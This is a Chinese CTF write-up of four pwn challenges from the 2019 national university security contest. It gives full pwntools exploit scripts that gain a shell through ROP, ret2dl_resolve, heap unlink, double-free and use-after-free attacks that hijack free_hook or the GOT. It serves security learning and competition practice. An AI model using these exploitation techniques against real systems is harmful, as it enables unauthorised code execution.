@@ -1,0 +1,771 @@
+# 2019全国大学生信息安全竞赛初赛pwn前四题writeup
+
+阅读量 **384438**
+
+|评论 **12**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-04-23 11:30:19
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p5.ssl.qhimg.com/t0102e6b1e775292b97.png)
+
+## 前言：
+
+这次比赛很尴尬，我本来以为自己报上了名，但是结果没报上。。。只能让同学给我发题目然后自己做，没法拿flag，一共六题，只做出来四题，两题栈，两题堆，最后两题做出来的队伍个数都只有16个，显然不是我这小破邮大一菜狗可以做出来的
+Or2。
+
+所有的二进制文件都在这里：[题目的二进制文件](https://github.com/xiaoxiaorenwu/mypwn/tree/master/2019_%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B)
+
+## 栈部分：
+
+###  0x1 第一天_your_pwn:
+
+**0x11功能分析和漏洞寻找：**
+
+首先gdb看一下题目基本信息，是64位的程序，PIE开启，NX开启，relro没开全。
+
+![](https://i.loli.net/2019/04/22/5cbd28c924856.png)
+
+放进ida看一下，在main函数里只是一些准备工作没有漏洞存在，我们进入vuln函数进一步分析：
+
+![](https://i.loli.net/2019/04/22/5cbd28c9056d8.png)
+
+![](https://i.loli.net/2019/04/22/5cbd28c9151b5.png)
+
+在vuln中我们发现了程序进行了41次循环，每一次输入一个下标index，以局部变量v4为基准泄露一个字节的内容，然后再改为新的数据，
+**漏洞点在于index没有进行大小检查，可以任意大，超出v4数组的范围到达main返回地址处，**
+这既实现了leak又实现了change，而且有41次机会，现在思路就很明了了！！
+
+**0x12 漏洞利用：**
+
+第一步还是leak出libc，根据经验我们知道在main函数返回地址附近一般会有__libc_start_main+240出现，我们可以泄露其然后进而泄露libc，这里的libc需要我们自己查找确定，我用的是wiki上的一个工具：[LibcSearcher](https://github.com/lieanu/LibcSearcher)，除了libc之外，我们还应泄露一下程序的基址，因为程序开了PIE，所以我们最后改main函数返回地址的时候要构造p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)这个payload的时候pop_rdi_addr这个gadget需要程序基址。
+
+main函数的rbp附近的stack分部如下图：我们可以利用画红圈的两个地方来leak出libc和基址。
+
+![](https://i.loli.net/2019/04/22/5cbd2d13bf128.png)
+
+第二步就是将main的返回地址改为payload=p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)。需要注意的是sh_addr和system可能因为libc的不同而产生一些小变化，保险起见还是直接调试看偏移最好，不要直接在libc中搜索。
+
+**0x13 exp如下：**
+
+    
+    
+    #coding:utf-8
+    
+    from pwn import *
+    from LibcSearcher import *
+    
+    context(os='linux',arch='amd64')
+    #context.log_level = 'debug'
+    
+    p = process('./pwn')
+    P = ELF('./pwn')
+    
+    p.recvuntil('name:')
+    p.send('x12x12x12x12x12x12x12x12')
+    ret_addr = [0 for i in range(6)]
+    
+    #----------------------------------------leak __libc_start_main_addr-------------------------------    for i in range(6):
+        p.recvuntil('input indexn')
+        p.sendline(str(624+8+i))  #具体数字自己调试，之后同，只要一块对了，然后之后算偏移即可。
+        p.recvuntil('value(hex) ')
+        addr = p.recv(8)
+        if(addr[0]=='f'):
+            addr = int(addr[6:],16)
+        else:
+            addr = int(addr[0:2],16)
+        log.success('one_addr = '+hex(addr))
+        p.recvuntil('new valuen')
+        p.sendline(str(addr))
+        ret_addr[i] = addr
+    
+    __libc_ret = ''
+    for i in range(6):
+        if(len(str(hex(ret_addr[5-i])))<4):
+            __libc_ret+= '0'+str(hex(ret_addr[5-i]))[2:]
+        else:
+            __libc_ret+= str(hex(ret_addr[5-i]))[2:]
+    
+    __libc_ret = int(__libc_ret,16)
+    log.success('__libc_ret = '+hex(__libc_ret))
+    
+    #---------------------------------------leak __libc_start_main_addr success------------------------    #---------------------------------------leak base_addr---------------------------------------------    for i in range(6):
+        p.recvuntil('input indexn')
+        p.sendline(str(624+i))
+        p.recvuntil('value(hex) ')
+        addr = p.recv(8)
+        if(addr[0]=='f'):
+            addr = int(addr[6:],16)
+        else:
+            addr = int(addr[0:2],16)
+        log.success('one_addr = '+hex(addr))
+        p.recvuntil('new valuen')
+        p.sendline(str(addr))
+        ret_addr[i] = addr
+    
+    pop_rdi = ''
+    for i in range(6):
+        if(len(str(hex(ret_addr[5-i])))<4):
+            pop_rdi+= '0'+str(hex(ret_addr[5-i]))[2:]
+        else:
+            pop_rdi+= str(hex(ret_addr[5-i]))[2:]
+    
+    #--------------------------------------leak base_addr success-----------------------------------    pop_rdi = int(pop_rdi,16)
+    pop_rdi = pop_rdi + 0x63
+    log.success('pop_rdi_addr = '+hex(pop_rdi))
+    
+    #--------------------------------------gain pop_rdi_addr success---------------------------------    
+    __libc_start_main_addr = __libc_ret - 240
+    libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)
+    libcbase = __libc_start_main_addr - libc.dump('__libc_start_main')
+    log.success('libcbase = '+hex(libcbase))
+    system_addr = libcbase + libc.dump('system') + 0x10    #自己调试进行调整，因为libc可能有微小差别。
+    sh_addr = libcbase + (0xc1ed57-0xa92000)               #自己调试，算偏移即可。
+    log.success('system_addr = '+hex(system_addr))
+    log.success('sh_addr = '+hex(sh_addr))   
+    #-------------------------------------gain system_addr and sh_addr success-----------------------    
+    #-------------------------------------将main函数返回地址改为pop_rdi_addr为system准备参数----------    for i in range(6):
+        p.recvuntil('input indexn')
+        p.sendline(str(624+8-288+i))
+        p.recvuntil('new valuen')
+        p.sendline(str(int(str(hex(pop_rdi))[12-2*i:14-2*i],16)))
+    
+    for i in range(8):
+        p.recvuntil('input indexn')
+        p.sendline(str(624+8-288+8+i))
+        p.recvuntil('new valuen')
+        if(i<6):
+            p.sendline(str(int(str(hex(sh_addr))[12-2*i:14-2*i],16)))
+        else:
+            p.sendline('0')
+    
+    for i in range(6):
+        p.recvuntil('input indexn')
+        p.sendline(str(624+8-288+16+i))
+        p.recvuntil('new valuen')
+        p.sendline(str(int(str(hex(system_addr))[12-2*i:14-2*i],16)))
+    
+    for i in range(9):
+        p.recvuntil('input indexn')
+        p.sendline('0')
+        p.recvuntil('new valuen')
+        p.sendline('0')
+    
+    #-------------------------------success---------------------------------------------------------    p.recvuntil('(yes/no)? n')
+    #gdb.attach(p)
+    p.sendline('no')
+    
+    p.interactive()
+    
+
+**0x14 收货：**
+
+可能在数据的处理和转化方面，字符串，16进制数，十进制数之间转化和拼接拆分有点繁杂，（可能因为我对python不太熟悉），其他到没有什么太坑人的地方，一些细节问题也需要注意一下，我从下午三点开始，五点不到解出的，基本都是在处理数据之间的转化和拼接。可能还有更好的思路，我也不敢过多评说。
+
+###  0x2 第二天_baby_pwn:
+
+**0x21 程序分析：**
+
+额。。。这一题怎么说呢，程序啥都没有，32位的，简直是ret2_dl_resolve的标准模板，直接把XDCTF
+2015的pwn200的exp搬过来改改数据就行了orz，比赛的时候秒出的。。。。。
+
+至于ret2_dl_resolve的教程在wiki上有，这篇文章也很详细：[ret2_dl_resolve](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)，我就不斗胆再说了orz，这里只分享一些我的感悟：
+
+**0x22 ret2_dl_runtime_solve 总结：**
+
+需要对三个部分和函数延迟绑定技术的流程熟悉：
+
+  1. .rel.plt节(函数重定位表)的结构体： //readelf -r <filename>  
+typedef struct {
+
+    
+        Elf32_Addr r_offset;    // 即got表的条目
+    Elf32_Word r_info;      // 很重要，为重点伪造对象。
+    
+
+} Elf32_Rel;  
+ _#_ define ELF32_R_SYM(info) ((info)>>8)  
+ _#_ define ELF32_R_TYPE(info) ((unsigned char)(info))  
+ _#_ define ELF32_R_INFO(sym, type) (((sym)<<8)+(unsigned char)(type))
+
+  2. .dynsym节(动态链接符号表)的结构体（其大小在32位中为0x10）：  
+typedef struct  
+{  
+Elf32_Word st_name; // 函数名字符串相对于.dynstr节起始地址的偏移  
+Elf32_Addr st_value; // Symbol value  
+Elf32_Word st_size; // Symbol size  
+unsigned char st_info; // Symbol type and binding  
+unsigned char st_other; // Symbol visibility under glibc>=2.2  
+Elf32_Section st_shndx; // Section index  
+} Elf32_Sym;
+
+  3. .dynstr节（动态链接的字符串）中储存了函数名。
+
+//节的地址可以用readelf -S <filename>来看。
+
+  1. .延迟绑定。用下图可以直观的看到。
+
+我们需要清楚GOT[0],GOT[1],GOT[2]和PLT[0]中的内容。
+
+我们需要做的就是在使调用函数的整个过程被我们所控制，首先劫持栈：
+
+payload+= p32(pop_rbp) + p32(mystack) + p32(leave_ret)
+
+然后需要在栈上布置这种结构：  
+payload = p32(mystack)  
+payload+= p32(plt_0_addr)  
+payload+= p32(fake_index)  
+payload+= p32(ret_addr)  
+payload+= p32(arguments)  
+payload+= fake_rel  
+payload+= fake_sym  
+payload = payload.ljust(0x80,’x00’)  
+payload+= fake_str
+
+之后我们要做的事分三步：  
+1.伪造fake_index来使程序跳入我们自己的fake_rel结构体  
+2.构造fake_rel的r_info来使程序跳到我们自己的fake_sym结构体 (这里需要我们自己来构造字节对齐。)  
+3.构造fake_sym结构体的st_name来使程序跳到我们自己的fake_str字符串。  
+其中fake_index，fake_rel，fake_sym，fake_str的地址都需要我们自己能够精确地控制。（栈注意迁移即可。）
+
+**0x23 exp如下：**
+
+    
+    
+    #coding:utf-8
+    
+    from pwn import *
+    
+    context(os='linux',arch='i386')
+    #context.log_level = 'debug'
+    
+    p = process('./pwn')
+    P = ELF('./pwn')
+    
+    lr = 0x08048448
+    bss = 0x0804aa00
+    pppr_addr = 0x080485d9
+    pop_ebp = 0x080485db
+    
+    payload = (0x28+4) * 'a'
+    payload+= p32(P.plt['read'])
+    payload+= p32(pppr_addr)
+    payload+= p32(0)
+    payload+= p32(bss) 
+    payload+= p32(0x400)
+    payload+= p32(pop_ebp)
+    payload+= p32(bss)
+    payload+= p32(lr)
+    p.send(payload)
+    
+    sleep(1)
+    
+    plt_0 = 0x08048380
+    r_info = 0x107
+    rel_plt = 0x0804833c  
+    dynsym =  0x080481dc
+    dynstr = 0x0804827c
+    
+    fake_sys_addr = bss + 36
+    align = 0x10 - ((fake_sys_addr-dynsym)&0xf)
+    fake_sys_addr = fake_sys_addr + align
+    index = (fake_sys_addr - dynsym)/0x10
+    r_info = (index << 8) + 0x7
+    st_name = (fake_sys_addr + 0x10) - dynstr
+    fake_sys = p32(st_name) + p32(0) + p32(0) + p32(0x12) 
+    
+    fake_rel = p32(P.got['read']) + p32(r_info)
+    fake_rel_addr = bss + 28
+    fake_index = fake_rel_addr - rel_plt    
+    
+    payload = p32(bss)
+    payload+= p32(plt_0)
+    payload+= p32(fake_index)
+    payload+= p32(0xdeadbeef)
+    payload+= p32(bss+0x80)
+    payload+= p32(0)
+    payload+= p32(0)
+    payload+= fake_rel
+    payload+= 'a'*align
+    payload+= fake_sys
+    payload+= 'system'
+    payload = payload.ljust(0x80,'x00')
+    payload+= '/bin/shx00'
+    p.sendline(payload)
+    
+    p.interactive()
+    
+
+**0x24 赛后：**
+
+在群里听一些师傅说可以用其他方法，爆破syscall之类的，我也不懂orz。。。。。不过貌似ret2_dl_solve在现在的题目中很少出现了。。。。但学了总比不知道好QAQ
+
+## 堆部分：
+
+(⊙o⊙)…我个人觉得这两道堆虽然都算不上难（难的话我也不可能做出来了orz），但是也都是稳中有变，还是挺有趣的，其中第一题daily漏洞点比较隐蔽，发现以后可以用double
+free或者unlink都行，我用unlink做到快最后的时候被一个地方卡住了（wtf
+>_<），感觉中间有点乱，就重新开始的，结果肝到最后才肝出来。第二天的是double，这一题比较顺利，两个小时不到就解出了，但是没想到他最后的分值竟然比daily高！！！（wtf
+逗我????）
+
+###  0x3 第一天_daily:
+
+**0x31 程序分析和漏洞寻找：**
+
+首先看一下程序的基本信息，为64位，PIE没开，relro为full，估计是堆题，需要改malloc_hook或者free_hook为one_gagdet的通用套路。
+
+![](https://i.loli.net/2019/04/22/5cbd42bd7ea9c.png)
+
+放进ida里进一步分析，发现程序有四个功能，add()，delete()，upgrade()，view()。
+
+![](https://i.loli.net/2019/04/22/5cbd42bcdad12.png)
+
+程序大致的流程就是在bss段有一个已知的地址区域存放各chunk的可用大小和堆指针（一个结构体占0x10大小），然后可以申请大小在0x100之下的chunk，
+**可以不填满，但是没有溢出漏洞。**
+upgrade()也没有溢出漏洞，输入的大小不能超过原先申请的大小，view()是以字符串的形式来打印chunk的内容。delete()就是通过index找到目标chunk，然后free()。
+
+浏览一遍发现似乎没有什么漏洞点orz，于是在次仔细看了一遍，发现了在delete()中在free()的时候index没有检查，所以我们可以free()任意地址的chunk。
+
+**0x32 漏洞利用：**
+
+第一步还是leak，这里我们需要思考我们需要leak出什么，libc我们肯定需要leak，因为malloc_hook或者free_hook或者one_gadget的真实地址都需要libc，其次我们还需要leak出heap的地址，因为我们要在heap里伪造chunk来进行unlink或者double
+free，所以必须得知道heap的地址，才能知道我们的fake_chunk的地址并把它放入伪造的chunk结构体中，进而成功free()出fake_chunk。因为要泄露libc和heap所以我们最好获取一个曾经在largebin之中的chunk的头部，所以先申请两个0x200大小的chunk，然后将它们free()，之后unsortedbin之中会出现一个0x420的chunk，然后我们再申请一个chunk的时候，根据glibc的机制，unsortedbin中的chunk会被遍历检查看有没有大小正好合适的，有的话直接分，没有的话会将所有的chunk放入对应的bins中，所以0x420的chunk被放入largebin中，所以再申请时我们得到的chunk是从largebin中切下来的fd_nextsize和bk_nextsize会被启用：
+
+![](https://i.loli.net/2019/04/22/5cbda832f2459.png)
+
+然后我们就可以通过对这个新的chunk读来泄露libc和heap地址。
+
+leak成功后，我们可以在随便一个0x200大小（大小足够就行。）的chunk里进行unlink的构造，然后通过偏移计算index来欺骗delete()，最后unlink实现之后我们就可以将Index
+4的指针改为malloc
+_hook的地址，然后再edit()改为one_gadget即可。。。。。**但是！！！操蛋的是我不知道为什么malloc_hook行不通，我试了四个gadgets都不行，以为凉了，结果换成free_hook就成了，不知道是什么原因orz，真的神奇
+>_<……….**
+
+double_free思路我就不说了，自己看exp吧，类似的。。。比unlink要简单一点。。。。
+
+**0x33 unlink思路_exp如下：**
+
+    
+    
+    #coding:utf-8
+    
+    from pwn import *
+    #from LibcSearcher import *
+    
+    context(os='linux',arch='amd64')
+    #context.log_level = 'debug'
+    
+    p = process('./daily')
+    
+    def add(size,payload):
+        p.recvuntil('choice:')
+        p.sendline('2')
+        p.recvuntil('daily:')
+        p.sendline(str(size))
+        p.recvuntil('dailyn')
+        p.send(payload)
+    
+    def view():
+        p.recvuntil('choice:')
+        p.sendline('1')
+    
+    def delete(index):
+        p.recvuntil('choice:')
+        p.sendline('4')
+        p.recvuntil('daily:')
+        p.sendline(str(index))
+    
+    def upgrade(index,payload):
+        p.recvuntil('choice:')
+        p.sendline('3')
+        p.recvuntil('daily:')
+        p.sendline(str(index))
+        p.recvuntil('dailyn')
+        p.send(payload)
+    
+    payload = 'x66'*0x200
+    add(len(payload),payload)     #index 0
+    add(len(payload),payload)     #index 1
+    add(len(payload),payload)     #index 2
+    add(len(payload),payload)     #index 3
+    
+    delete(1)                     #delete 1
+    delete(2)                     #delete 2
+    
+    payload = 'x12'*8
+    add(0x1a0,payload)            #index 1      size无所谓，看心情。。。
+    #-------------------------------------------利用large chunkl来leak libcbase和heapbase---------    view()
+    p.recvuntil('x12x12x12x12x12x12x12x12')
+    main_arena_addr = u64(p.recv(6).ljust(8,'x00')) - (0xf68-0xb20)
+    log.success('main_arena_addr = '+hex(main_arena_addr))
+    libcbase = main_arena_addr - (0x4be5b20-0x4821000)
+    log.success('libcbase = '+hex(libcbase))
+    
+    payload = 'x12'*12+'x21'*4
+    upgrade(1,payload)
+    view()
+    p.recvuntil('x21x21x21x21')
+    heap_addr = u64(p.recv(4).ljust(8,'x00')) - 0x210
+    log.success('heap_addr = '+hex(heap_addr))
+    #gdb.attach(p)
+    
+    #-----------------------------------------------leak success--------------------------------------    payload = 'a'*8
+    add(0x260,payload)            #index 2  这里清空unsortedbin为了使之后的思路更清晰。
+    #gdb.attach(p)
+    
+    #-----------------------------------------------prepare unlink------------------------------------    payload = p64(0)
+    payload+= p64(0xa1)
+    payload+= p64(0)*2
+    payload+= p64(0xa0)
+    payload+= p64(heap_addr+0x20)
+    payload = payload.ljust(0xa0,'x00')
+    payload+= p64(0x0)
+    payload+= p64(0x91)
+    payload+= p64(0)*2
+    payload+= p64(0x80)
+    payload+= p64(heap_addr+0xc0)
+    payload = payload.ljust(0x130,'x00')
+    payload+= p64(0)
+    payload+= p64(0x21)
+    payload+= p64(0)*2
+    payload+= p64(0)
+    payload+= p64(0x21)
+    upgrade(0,payload)
+    #gdb.attach(p)
+    
+    index = (heap_addr + 0x30 - 0x602060)/0x10
+    delete(index)               
+    #gdb.attach(p)
+    
+    payload = p64(0)
+    add(0x90,payload)             #index 4
+    
+    payload = p64(0)*2
+    payload+= p64(0)
+    payload+= p64(0x91)
+    payload+= p64(0x6020a8-0x18)
+    payload+= p64(0x6020a8-0x10)
+    payload+= p64(0)*14
+    
+    payload+= p64(0x90)
+    payload+= p64(0x90)
+    payload+= p64(0)*2
+    payload+= p64(0x80)
+    payload+= p64(heap_addr+0xc0)
+    payload+= p64(0)*12
+    payload+= p64(0)
+    payload+= p64(0x21)
+    payload+= p64(0)*2
+    payload+= p64(0)
+    payload+= p64(0x21)
+    
+    upgrade(0,payload)
+    
+    #gdb.attach(p)
+    
+    index = (heap_addr + 0xd0 - 0x602060)/0x10
+    delete(index)
+    #gdb.attach(p)
+    #-------------------------------unlink success---------------------------------------------    
+    free_hook = libcbase + (0x1728f7a8 - 0x16ec9000)
+    log.success('free_hook = ' + hex(free_hook))
+    payload = p64(0)*2
+    payload+= p64(0x80)
+    payload+= p64(free_hook)
+    upgrade(4,payload)
+    #gdb.attach(p)
+    
+    one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
+    upgrade(4,p64(one_gadget[1]+libcbase))
+    
+    #gdb.attach(p)
+    delete(0)
+    
+    p.interactive()
+    
+
+**0x35 double_free思路_exp如下：**
+
+    
+    
+    #coding:utf-8
+    
+    from pwn import *
+    #from LibcSearcher import *
+    
+    context(os='linux',arch='amd64')
+    #context.log_level = 'debug'
+    
+    p = process('./daily')
+    
+    def add(size,payload):
+        p.recvuntil('choice:')
+        p.sendline('2')
+        p.recvuntil('daily:')
+        p.sendline(str(size))
+        p.recvuntil('dailyn')
+        p.send(payload)
+    
+    def view():
+        p.recvuntil('choice:')
+        p.sendline('1')
+    
+    def delete(index):
+        p.recvuntil('choice:')
+        p.sendline('4')
+        p.recvuntil('daily:')
+        p.sendline(str(index))
+    
+    def upgrade(index,payload):
+        p.recvuntil('choice:')
+        p.sendline('3')
+        p.recvuntil('daily:')
+        p.sendline(str(index))
+        p.recvuntil('dailyn')
+        p.send(payload)
+    
+    payload = 'x66'*0x200
+    add(len(payload),payload)     #index 0
+    add(len(payload),payload)     #index 1
+    add(len(payload),payload)     #index 2
+    add(len(payload),payload)     #index 3
+    
+    delete(1)                     #delete 1
+    delete(2)                     #delete 2
+    
+    payload = 'x12'*8
+    add(0x1a0,payload)            #index 1 
+    
+    #------------------------------------------------利用large chunkl来leak libcbase和heapbase---------------------------------    view()
+    p.recvuntil('x12x12x12x12x12x12x12x12')
+    main_arena_addr = u64(p.recv(6).ljust(8,'x00')) - (0xf68-0xb20)
+    log.success('main_arena_addr = '+hex(main_arena_addr))
+    libcbase = main_arena_addr - (0x4be5b20-0x4821000)
+    log.success('libcbase = '+hex(libcbase))
+    
+    payload = 'x12'*12+'x21'*4
+    upgrade(1,payload)
+    view()
+    p.recvuntil('x21x21x21x21')
+    heap_addr = u64(p.recv(4).ljust(8,'x00')) - 0x210
+    log.success('heap_addr = '+hex(heap_addr))
+    #gdb.attach(p)
+    
+    #-----------------------------------------------leak success--------------------------------------    payload = 'a'*8
+    add(0x31,payload)            #index 2  
+    #------------------------------------------------prepare doublefree--------------------------------    payload = p64(0)+p64(0x31) 
+    payload+= p64(0)*2
+    payload+= p64(0x20)+p64(heap_addr+0x20)
+    payload+= p64(0)+p64(0x31)
+    payload+= p64(0)*2
+    payload+= p64(0x20)+p64(heap_addr+0x50)
+    payload+= p64(0)+p64(0x31)
+    upgrade(0,payload)
+    
+    index = (heap_addr + 0x30 - 0x602060)/0x10
+    delete(index)
+    
+    index = (heap_addr + 0x60 - 0x602060)/0x10
+    delete(index)
+    
+    payload = p64(0)+p64(0x31) 
+    payload+= p64(0)*2
+    payload+= p64(0x20)+p64(heap_addr+0x20)
+    payload+= p64(0)+p64(0x31)
+    upgrade(0,payload)
+    
+    index = (heap_addr + 0x30 - 0x602060)/0x10
+    delete(index)
+    #-----------------------------------------------double free success--------------------------------    payload = p64(0x602078) 
+    add(0x20,payload)                     #index 3
+    
+    free_hook = libcbase + (0x1728f7a8 - 0x16ec9000)
+    log.success('free_hook = ' + hex(free_hook))
+    
+    payload = p64(free_hook)
+    add(0x20,payload)                                 #index 4
+    add(0x20,payload)                                 #index 5
+    add(0x20,payload)                                 #index 6
+    
+    one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
+    upgrade(2,p64(one_gadget[1]+libcbase))
+    
+    delete(4)
+    
+    p.interactive()
+    
+
+**0x36 收货：**
+
+可能需要对free()的检查机制了解的比较深入才能得心应手的快速解出这一题，我第一遍因为思路不清晰导致不知道改了一个什么东西总是报错，第二遍整理一下思路才Pwn掉，挺丢人的。。。。。题目出的稳中有活，难度也适合像我这种初学者，感觉出的不错。。。。>_<.
+
+###  0x4 第二天_double:
+
+**0x41 程序功能分析：**
+
+首先看一下程序的基本信息：64位，relro为paril，没开PIE，看题目的名字猜是double
+free….(但实际上最后我没用上double,只用了uaf来构造fake_chunk….orz)
+
+![](https://i.loli.net/2019/04/22/5cbd76773bde9.png)
+
+放进ida看一下：程序是按照链表的形式表现的，之前做过一个类似的链表的题目。。。感觉比这个难一点。。首先head_ptr和prev_ptr都清零。。(这里变量我已经rename了，所以看着好理解一点，开始自己看的时候还是需要看一会)
+
+![](https://i.loli.net/2019/04/22/5cbd7672c735b.png)
+
+之后程序有4个功能，new()，show()，edit()，delete()：
+
+![](https://i.loli.net/2019/04/22/5cbd7676bf4d9.png)
+
+分析程序功能以后，new()大概功能就是在堆上申请一个chunk_header(总大小为0x20，之中储存了content的size和chunk的index，，以及自己的content的地址和上一个chunk的chunk_header的地址。)，然后先将我们的输入储存在一个缓冲区，然后比较其内容和上一个chunk的content是否一样，如果一样话，就不再用malloc()申请新的chunk，而是将其的content地址直接指向上一个chunk的content地址，若不一样的话就再malloc()一块和我们输入大小一样的chunk。
+
+show()的功能为输入下标然后遍历chunk链表找到下标符合的chunk然后以字符串的形式打印其content内容（x00截断）
+
+edit()的功能为输入下标然后遍历chunk链表找到下表合适的chunk然后比较我们输入的centent大小和之前的大小，若比其小则直接在原content处覆盖，若比其大则再malloc()一块chunk。
+
+delete()的功能为输入下标然后遍历chunk链表知道下标合适的chunk然后
+**先释放其content指针，再释放其chunk_header指针。**
+需要注意的是这个程序是一旦delete()一个下标之后，这个下标将不再存在，下一次再申请是继续往后延伸的下标，不会找已经已经free()的小的下标。细节不要搞错了。。。
+
+**0x42 漏洞寻找：**
+
+先找了一会，没有发现溢出漏洞。。。然后开始考虑 uaf 和 double
+free，利用glibc的机制来leak和构造fake，然后发现如果申请两个内容相同的chunk时，然后delete()其中一个，但另外一个仍然可以对已经放进bins的原先装content的那个chunk进行读写操作。。。思路开始变得清晰。。。
+
+**0x43 漏洞利用：**
+
+首先我们申请一个大小范围在fastbin之外（总大小大于0x80）的chunk，然后进行uaf的读操作泄露出libc，之后再申请小的chunk，这些小的chunk和他们的chunk_header都会被分配在uaf的区域（因为其原先在unsortedbin中），然后我们可以通过uaf的写入功能更改新chunk_header的content指针为free_got的地址，并且先在堆中写入’/bin/shx00’，然后通过新chunk的upgrade功能将free_addr改为system_addr，然后再申请一个新的小chunk，其header应该还是在uaf区域，然后通过uaf的写入修改其content指针为‘/bin/shx00’字符串的地址（我们之前已经写在了堆上，所以我们需要泄露heap的地址！！方法类似，在最开始的时候申请一个大小在fastbin范围内的chunk然后进行uaf，利用uaf的读功能泄露heap地址。），最后delete()最后申请的那个chunk即可，在free(content指针)时就等于调用了system(‘/bin/shx00’)。
+
+**0x44 exp如下：**
+
+    
+    
+    #coding:utf-8
+    
+    from pwn import *
+    
+    context(os='linux',arch='amd64')
+    #context.log_level = 'debug'
+    
+    p = process('./pwn')
+    P = ELF('./pwn')
+    
+    def new(payload):
+        p.recvuntil('> ')
+        p.sendline('1')
+        p.recvuntil('data:n')
+        p.sendline(payload)
+    
+    def edit(index,payload):
+        p.recvuntil('> ')
+        p.sendline('3')
+        p.recvuntil('index: ')
+        p.sendline(str(index))
+        p.sendline(payload)
+    
+    def delete(index):
+        p.recvuntil('> ')
+        p.sendline('4')
+        p.recvuntil('index: ')
+        p.sendline(str(index))
+    
+    def list_(index):
+        p.recvuntil('> ')
+        p.sendline('2')
+        p.recvuntil('index: ')
+        p.sendline(str(index))
+    
+    new('x11'*0xf)    #index 0          
+    new('x11'*0xf)    #index 1             0和1共用content chunk
+    new('x22'*0x7f)   #index 2
+    new('x22'*0x7f)   #index 3             2和3共用content chunk
+    new('x44'*0xf)   #index 4              防topchunk合并
+    #gdb.attach(p)
+    
+    delete(3)
+    
+    #-------------------------------------leak libcbase and system_addr and heap-----------------------    list_(2)
+    
+    main_arena_addr = u64(p.recv(6).ljust(8,'x00')) - 88
+    log.success('main_arena = '+hex(main_arena_addr))    
+    libcbase = main_arena_addr - (0xdd8b20-0xa14000)
+    log.success('libcbase = '+hex(libcbase))
+    system_addr = libcbase + (0xbab390 - 0xb66000)
+    log.success('system_addr = '+hex(system_addr))
+    #gdb.attach(p)
+    
+    delete(1)
+    
+    list_(0)
+    
+    heap_addr = u64(p.recv(4).ljust(8,'x00')) - 0x110
+    log.success('heap_addr = '+hex(heap_addr))
+    #--------------------------------------leak success------------------------------------------------    new('x55'*0xf)          #index 5
+    new('x66'*0xf)          #      6
+    new('x77'*0xf)          #      7
+    new('x88'*0xf)          #      8
+    
+    payload = '/bin/shx00'
+    payload+= 'x55'*0x10
+    payload+= p64(0x21)
+    payload+= 'x07'+'x00'*3+'x0f'+'x00'*3
+    payload+= p64(P.got['free'])
+    payload+= p64(heap_addr+0xf0)
+    payload+= p64(0x21)
+    payload+= 'x22'*0x18
+    payload+= p64(0x31)
+    payload+= 'x08'+'x00'*3+'x0f'+'x00'*3
+    payload+= p64(heap_addr+0x90)                  #“/bin/shx00”的地址。
+    edit(2,payload)
+    
+    payload = p64(system_addr)
+    edit(7,payload)
+    
+    delete(8)
+    
+    p.interactive()
+    
+
+**0x45 收货：**
+
+感觉挺有趣的，链表形式的题目还是很有趣，觉得无论是doublefree还是什么，对glibc的机制了如指掌才是真正的王道。。。对每一块chunk的来源和去向和他们什么时候该有什么内容都在心中清楚才能最快的找到思路并且在调试上节约时间。。。这一题最后是100p多一点，比daily还高，可能考的堆机制的理解更深一点吧。。。。
+
+## 结语:
+
+虽然报名出现了操蛋的问题，但还是很开心能做出来四道基础题，对于学了一年不到的我来说已经是一件很开心的事情了orz。。。接下来就该静下心准备tsctf了。。天枢等我！！！
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **xiaoxiaorenwu** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/177035](/post/id/177035)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+
+ **+1** __15赞
+
+ __收藏
+
+![](https://p0.ssl.qhimg.com/t0109033bebe6ce0fea.png) xiaoxiaorenwu
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
